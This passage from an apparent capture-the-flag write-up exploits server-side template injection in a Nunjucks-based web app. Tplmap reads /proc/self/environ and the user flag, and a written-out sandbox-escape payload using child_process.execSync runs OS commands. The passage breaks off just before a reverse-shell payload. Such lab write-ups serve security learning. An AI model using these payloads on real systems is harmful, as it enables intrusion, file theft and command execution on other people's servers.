</span></span></code></pre></div><p>Then I will point <code>tplmap</code> to the middleware.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46»
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
</span></span></code></pre></div><p>Now I&rsquo;ll just wait for it to finish, and here&rsquo;s the image of how it went.</p>
<p><div class="img-container"><img src="imgs/image-20211105213721440.png" alt="image-20211105213721440"  /></div>
</p>
<p>After a few sec later, <code>tplmap</code> finally got it right.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
</span></span><span class="line"><span class="cl">    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  GET parameter: email
</span></span><span class="line"><span class="cl">  Engine: Nunjucks
</span></span><span class="line"><span class="cl">  Injection: <span class="o">{{</span>*<span class="o">}}</span>
</span></span><span class="line"><span class="cl">  Context: text
</span></span><span class="line"><span class="cl">  OS: linux
</span></span><span class="line"><span class="cl">  Technique: render
</span></span><span class="line"><span class="cl">  Capabilities:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Shell <span class="nb">command</span> execution: no
</span></span><span class="line"><span class="cl">   Bind and reverse shell: no
</span></span><span class="line"><span class="cl">   File write: ok
</span></span><span class="line"><span class="cl">   File read: ok
</span></span><span class="line"><span class="cl">   Code evaluation: ok, javascript code
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Rerun tplmap providing one of the following options:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    --upload LOCAL REMOTE       Upload files to the server
</span></span><span class="line"><span class="cl">    --download REMOTE LOCAL     Download remote files
</span></span></code></pre></div><p>Based on the <code>tplmap</code> results, it seems that command execution is not possible.</p>
<h4 id="grabbing-the-flag">Grabbing The Flag</h4>
<p>With the file read ability, the first file I want to grab isn&rsquo;t <code>/etc/passwd</code>, but <code>/proc/self/environ</code>, which most likely to reveal some sensitive information.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>tplmap-venv<span class="o">)</span> → kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> 
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/proc/self/environ&#39;</span> <span class="s1">&#39;loot/dl_environ&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
</span></span><span class="line"><span class="cl">    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  GET parameter: email
</span></span><span class="line"><span class="cl">  Engine: Nunjucks
</span></span><span class="line"><span class="cl">  Injection: <span class="o">{{</span>*<span class="o">}}</span>
</span></span><span class="line"><span class="cl">  Context: text
</span></span><span class="line"><span class="cl">  OS: linux
</span></span><span class="line"><span class="cl">  Technique: render
</span></span><span class="line"><span class="cl">  Capabilities:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Shell <span class="nb">command</span> execution: no
</span></span><span class="line"><span class="cl">   Bind and reverse shell: no
</span></span><span class="line"><span class="cl">   File write: ok
</span></span><span class="line"><span class="cl">   File read: ok
</span></span><span class="line"><span class="cl">   Code evaluation: ok, javascript code
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">][</span>plugin<span class="o">]</span> Remote file md5 mismatch, check manually
</span></span></code></pre></div><p>Even though the tool showed md5 mismatch, I can still read the file contents. This file reveals that the app is running as user <code>david</code> under <code>/var/www/store.nunchucks</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ cat loot/dl_environ <span class="p">|</span> tr <span class="s1">&#39;,&#39;</span> <span class="s1">&#39;\n&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">LANG</span><span class="o">=</span>en_GB.UTF-8PATH<span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/binPIDFILE<span class="o">=</span>/home/david/.pm2/pm2.pidHOME<span class="o">=</span>/home/davidLOGNAME<span class="o">=</span><span class="nv">davidUSER</span><span class="o">=</span><span class="nv">davidSHELL</span><span class="o">=</span>/bin/bashINVOCATION_ID<span class="o">=</span><span class="nv">c56bdde5ecfc4ab2800ce66c625918d4JOURNAL_STREAM</span><span class="o">=</span>9:34693PM2_USAGE<span class="o">=</span><span class="nv">CLIPM2_HOME</span><span class="o">=</span>/home/david/.pm2SILENT<span class="o">=</span><span class="nv">truewindowsHide</span><span class="o">=</span><span class="nv">truepm2_env</span><span class="o">={</span><span class="s2">&#34;kill_retry_time&#34;</span>:100
</span></span><span class="line"><span class="cl"><span class="s2">&#34;windowsHide&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;treekill&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;automation&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pmx&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;instance_var&#34;</span>:<span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;watch&#34;</span>:false
</span></span><span class="line"><span class="cl"><span class="s2">&#34;autorestart&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;vizion&#34;</span>:true
</span></span><span class="line"><span class="cl"><span class="s2">&#34;env&#34;</span>:<span class="o">{</span><span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;server&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span><span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;namespace&#34;</span>:<span class="s2">&#34;default&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;filter_env&#34;</span>:<span class="o">[]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;server&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;node_args&#34;</span>:<span class="o">[]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_exec_path&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks/server.js&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_cwd&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;exec_interpreter&#34;</span>:<span class="s2">&#34;node&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;exec_mode&#34;</span>:<span class="s2">&#34;cluster_mode&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_out_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-out-6.log&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_err_log_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/logs/server-error-6.log&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_pid_path&#34;</span>:<span class="s2">&#34;/home/david/.pm2/pids/server-6.pid&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;km_link&#34;</span>:false
</span></span><span class="line"><span class="cl"><span class="s2">&#34;vizion_running&#34;</span>:false
</span></span><span class="line"><span class="cl"><span class="s2">&#34;NODE_APP_INSTANCE&#34;</span>:5
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PM2_USAGE&#34;</span>:<span class="s2">&#34;CLI&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;OLDPWD&#34;</span>:<span class="s2">&#34;/var/www&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;_&#34;</span>:<span class="s2">&#34;/usr/local/bin/pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MAIL&#34;</span>:<span class="s2">&#34;/var/mail/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;DBUS_SESSION_BUS_ADDRESS&#34;</span>:<span class="s2">&#34;unix:path=/run/user/1000/bus&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PATH&#34;</span>:<span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HUSHLOGIN&#34;</span>:<span class="s2">&#34;FALSE&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;JOURNAL_STREAM&#34;</span>:<span class="s2">&#34;9:35778&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_RUNTIME_DIR&#34;</span>:<span class="s2">&#34;/run/user/1000&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_ID&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_VTNR&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHLVL&#34;</span>:<span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;USER&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSOPEN&#34;</span>:<span class="s2">&#34;| /usr/bin/lesspipe %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;TERM&#34;</span>:<span class="s2">&#34;linux&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_CLASS&#34;</span>:<span class="s2">&#34;user&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LESSCLOSE&#34;</span>:<span class="s2">&#34;/usr/bin/lesspipe %s %s&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;INVOCATION_ID&#34;</span>:<span class="s2">&#34;d8a8bc4baeb140c685790fc6e1974718&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LS_COLORS&#34;</span>:<span class="s2">&#34;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;launching&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_uptime&#34;</span>:1636123032873
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_actions&#34;</span>:<span class="o">[]</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_monitor&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_options&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;axm_dynamic&#34;</span>:<span class="o">{}</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;created_at&#34;</span>:1633378615869
</span></span><span class="line"><span class="cl"><span class="s2">&#34;restart_time&#34;</span>:2
</span></span><span class="line"><span class="cl"><span class="s2">&#34;unstable_restarts&#34;</span>:0
</span></span><span class="line"><span class="cl"><span class="s2">&#34;_pm2_version&#34;</span>:<span class="s2">&#34;5.1.1&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;version&#34;</span>:<span class="s2">&#34;1.0.0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;versioning&#34;</span>:null
</span></span><span class="line"><span class="cl"><span class="s2">&#34;node_version&#34;</span>:<span class="s2">&#34;10.19.0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;pm_id&#34;</span>:6
</span></span><span class="line"><span class="cl"><span class="s2">&#34;exit_code&#34;</span>:0<span class="o">}</span><span class="nv">NODE_UNIQUE_ID</span><span class="o">=</span><span class="nv">12NODE_CHANNEL_FD</span><span class="o">=</span><span class="m">3</span>
</span></span></code></pre></div><p>Since I know the username, I can try to grab the flag now.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/home/david/user.txt&#39;</span> <span class="s1">&#39;loot/user.txt&#39;</span>
</span></span><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ cat loot/user.txt
</span></span><span class="line"><span class="cl">bac81...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h3 id="shell-as-david">Shell as david</h3>
<h4 id="tpl-shell">tpl-shell</h4>
<p>With write access, I tried to drop my public key to <code>/home/david/.ssh/authorized_keys</code>, but didn&rsquo;t work. One possible thing is that there is no <code>.ssh</code> folder, and to create one I need command execution!</p>
<p>After some hours, I tried the <code>--tpl-shell</code>, and using the <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">same blog</a> for syntax reference.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
</span></span><span class="line"><span class="cl">$ tplmap -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --tpl-shell
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
</span></span><span class="line"><span class="cl">    Automatic Server-Side Template Injection Detection and Exploitation Tool
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  GET parameter: email
</span></span><span class="line"><span class="cl">  Engine: Nunjucks
</span></span><span class="line"><span class="cl">  Injection: <span class="o">{{</span>*<span class="o">}}</span>
</span></span><span class="line"><span class="cl">  Context: text
</span></span><span class="line"><span class="cl">  OS: linux
</span></span><span class="line"><span class="cl">  Technique: render
</span></span><span class="line"><span class="cl">  Capabilities:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Shell <span class="nb">command</span> execution: no
</span></span><span class="line"><span class="cl">   Bind and reverse shell: no
</span></span><span class="line"><span class="cl">   File write: ok
</span></span><span class="line"><span class="cl">   File read: ok
</span></span><span class="line"><span class="cl">   Code evaluation: ok, javascript code
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Inject multi-line template code. Press ctrl-D to send the lines
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt;
</span></span></code></pre></div><p>Previously <code>tplmap</code> identified that I didn&rsquo;t have code/OS command execution, but here&rsquo;s what I got when trying to create <code>.ssh</code> folder:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -la ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;mkdir ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
</span></span><span class="line"><span class="cl">total 0<span class="se">\n</span>
</span></span></code></pre></div><p>I definitely can execute OS command 😮!</p>
<h4 id="reverse-shell">Reverse shell</h4>
<p>I tried to inject my SSH pubkey and login, but a password prompt pops out. Therefore, I will use a base64 encoded reverse shell.</p>
<p>The payload:</p>
